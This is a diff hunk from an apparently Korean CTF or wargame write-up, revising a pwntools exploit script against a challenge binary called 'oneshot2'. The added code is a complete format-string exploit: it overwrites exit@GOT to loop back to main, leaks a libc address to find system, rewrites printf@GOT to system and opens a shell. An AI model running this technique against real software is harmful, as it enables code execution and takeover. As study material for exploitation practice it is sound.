@@ -44,39 +44,86 @@ payload 단계를 구성하면 다음과 같다.
 
 from pwn import *
 
-# context.log_level = 'debug'
-
-e = ELF("./oneshot1")
+e = ELF('./oneshot2')
 p = process(e.path)
 libc = e.libc
 
 
+main = e.symbols['main']
+printf_got = e.got['printf']
+
+
+main_low = main & 0xffff
+main_high = (main >> 16) & 0xffff
+
+
 p.recvuntil(b"\n\n")
-payload = f'%{e.symbols["main"] >> 16}c'.encode() #main_high
-payload += b"%10$hn"
-payload += f"%{(e.symbols['main'] & 0xffff) - (e.symbols['main'] >> 16)}c".encode() #main_low - main_high
-payload += b"%11$hn"
+payload = f'%{main_high}c'.encode()
+payload += b'%10$hn'
+payload += f'%{main_low - main_high}c'.encode()
+payload += b'%11$hn'
 payload = payload.ljust(0x20, b"\x00")
 payload += p64(e.got["exit"] + 2)
 payload += p64(e.got["exit"])
 
+#pause()
 p.send(payload)
 
-system_got = 
 
 p.recvuntil(b"\n\n")
-payload = f'%{e.symbols["system"] >> 16}c'.encode() #system_high
-payload += b"%10$hn"
-payload += f"%{(e.symbols['system'] & 0xffff) - (e.symbols['system'] >> 16)}c".encode() #system_low - system_high
-payload += b"%11$hn"
-payload = payload.ljust(0x20, b"\x00")
-payload += p64(e.got["printf"] + 2)
-payload += p64(e.got["printf"])
+payload = ''
+payload += 'leak:%15$p'
+
+#pause()
+p.sendline(payload)
+
+p.recvuntil('leak:')
+leak = int(p.recv(14),16) 
+#log.info('\tleak : '+ hex(leak))
+
+libc_base = leak - libc.symbols['__libc_start_main'] - 231
+system = libc_base + libc.symbols['system']
+
+#log.info('\tlibc base '+ hex(libc_base))
+
+system_low = system & 0xffff
+system_middle = (system >> 16) & 0xffff
+system_high = (system >> 32) & 0xffff
+
+low = system_low
+
+if system_middle > system_low:
+    middle = system_middle - system_low
+else:
+    middle = 0x10000 + system_middle - system_low
+
+if system_high > system_middle:
+    high = system_high - system_middle
+else:
+    high = 0x10000 + system_high - system_middle
+
+
+#log.info('[3] input : printf@got -> system')
+
+
+p.recvuntil(b"\n\n")
+payload = f'%{low}c'.encode()
+payload += b'%11$hn'
+payload += f'%{middle}c'.encode()
+payload += b'%12$hn'
+payload += f'%{high}c'.encode()
+payload += b'%13$hn'
+payload += b'\x00'*(8 - len(payload) % 8)
+payload += p64(printf_got)
+payload += p64(printf_got + 2)
+payload += p64(printf_got + 4)
+
+
+#pause()
 p.send(payload)
 
-
+#pause()
 p.send(b'/bin/sh\x00')
-
 
 p.interactive()
 
